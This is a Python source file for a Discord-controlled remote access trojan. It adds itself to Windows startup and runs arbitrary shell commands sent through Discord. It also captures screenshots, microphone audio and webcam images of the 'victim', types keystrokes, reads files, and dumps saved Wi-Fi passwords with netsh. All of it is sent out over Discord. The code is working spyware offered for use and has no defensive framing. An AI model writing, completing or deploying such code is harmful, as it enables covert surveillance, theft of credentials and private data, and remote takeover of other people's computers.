import discord
import os # default module
import pyautogui
import subprocess
import pyaudio
import wave
import cv2
import time
from discord.ext import commands
import platform
import shutil
import winshell


#THIS WAS MADE BY XTECHER
#THIS WAS MADE BY XTECHER
#THIS WAS MADE BY XTECHER
#THIS WAS MADE BY XTECHER
#THIS WAS MADE BY XTECHER
#THIS WAS MADE BY XTECHER
#THIS WAS MADE BY XTECHER
#THIS WAS MADE BY XTECHER


def add_to_startup(file_path):
    startup_folder = winshell.startup()
    shortcut_path = os.path.join(startup_folder, "MyScript.lnk")
    
    with winshell.shortcut(shortcut_path) as shortcut:
        shortcut.path = file_path
        shortcut.description = "MyScript"

current_file_path = os.path.abspath(__file__)
add_to_startup(current_file_path)

def get_connected_wifi_networks():
    connected_networks = []
    result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], capture_output=True, text=True)
    if result.returncode == 0:
        lines = result.stdout.split('\n')
        for line in lines:
            if "SSID" in line:
                ssid = line.strip().split(": ")[1]
                connected_networks.append(ssid)
    return connected_networks

def is_text_file(file_path):
    try:
        with open(file_path, 'rb') as f:
            for line in f:
                try:
                    line.decode('utf-8')
                except UnicodeDecodeError:
                    return False  
    except FileNotFoundError:
        return False  
    return True  


bot = discord.Bot()

bot_prefix = "!"

command_prefix = commands.when_mentioned_or(bot_prefix)

bot = commands.Bot(command_prefix=command_prefix)

@bot.event
async def on_ready():
    print(f"{bot.user} is ready and online!")


@bot.slash_command(name = "screenie", description = "Screenie your victim!")
async def screenie(ctx):
    screenshot = pyautogui.screenshot()
    real_shot = "screenshot.png"
    screenshot.save(real_shot)
    await ctx.send(file=discord.File(real_shot))


@bot.slash_command(name = "files", description = "List files in Directory")
async def list(ctx):
    files = os.listdir()
    for file in files:
        await ctx.send("`" + file + "`")

@bot.slash_command(name="open", description="Open a file")
async def open_file(ctx, file: str):
    if os.path.exists(file):
        if is_text_file(file):
            with open(file, 'r', encoding='utf-8') as f:
                file_content = f.read()
            await ctx.send("```" + file_content + "```")
        else:
            await ctx.send(file=discord.File(file))
    else:
        await ctx.send("File not found.")


@bot.slash_command(name="command", description="Run Commands!")
async def run_command(ctx, command: str):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout.strip()
        if output:
            await ctx.send("```\n" + output + "\n```")
        else:
            await ctx.send("Command executed successfully.")
    except Exception as e:
        await ctx.send("An error occurred while executing the command: " + str(e))

@bot.slash_command(name="record", description="Listen to whatever your victim is saying")
async def record(ctx, length: int):
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        CHUNK = 1024
        RECORD_SECONDS = length
        FINAL = "output.wav"
        audio = pyaudio.PyAudio()
        stream = audio.open(format=FORMAT,channels=CHANNELS,rate=RATE,input=True,frames_per_buffer=CHUNK)
        await ctx.send("Recording..")
        frames = []
        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(data)
        await ctx.send("Finished recording.")
        stream.stop_stream()
        stream.close()
        audio.terminate()
        with wave.open(FINAL, 'wb') as wf:
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(audio.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
        await ctx.send("Recording saved")
        await ctx.send(file=discord.File(FINAL))
        os.remove(FINAL)

@bot.slash_command(name="picture", description="🪴🪴🪴🪴🪴🪴🪴🪴🪴")
async def record(ctx, duration: int):
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            await ctx.send("Webcam was unable to be opened")
            return
        cap.set(cv2.CAP_PROP_EXPOSURE, 50000000)
        cap.set(cv2.CAP_PROP_GAIN, 10000)
        start_time = time.time()
        while (time.time() - start_time) < duration:
            ret, frame = cap.read()
            if not ret:
                await ctx.send("Failed to capture image")
                break
            last_frame = frame

        cap.release()
        cv2.imwrite("LALALALALA.jpg", frame)
        await ctx.send(file=discord.File("LALALALALA.jpg"))
        os.remove("LALALALALA.jpg")
    except Exception as problem_bro:
        await ctx.send(f"Error:{problem_bro}")

@bot.slash_command(name="keystrokes", description="Type stuff in from your targets computer")
async def keystrokes(ctx, type: str):
    try:
        pyautogui.typewrite(type)
        await ctx.send("Successfully Sent")
    except Exception as e:
        await ctx.send(f"The following error occured{str(e)}")

@bot.slash_command(name="info", description="General target info")
async def info(ctx):
    connected_networks = get_connected_wifi_networks()
    await ctx.send(f"Computer Platform: {platform.platform()}")
    await ctx.send(f"Architecture: {platform.architecture()}")
    await ctx.send(f"Computer Name: {platform.node()}")
    await ctx.send(f"Processor: {platform.processor()}")
    await ctx.send(f"Wifi Networks: {connected_networks}")
    for wifi_info in connected_networks:
        await ctx.send(f"Info for {wifi_info}:")
        infobro = subprocess.run(f"netsh wlan show profiles name=\"{wifi_info}\" key=clear", shell=True, capture_output=True, text=True)
        if infobro.returncode == 0:
            await ctx.send(infobro.stdout)
        else:
            await ctx.send("Failed to retrieve info for this network.")
    

bot.run("This was some fun side project, also enter your bot token here")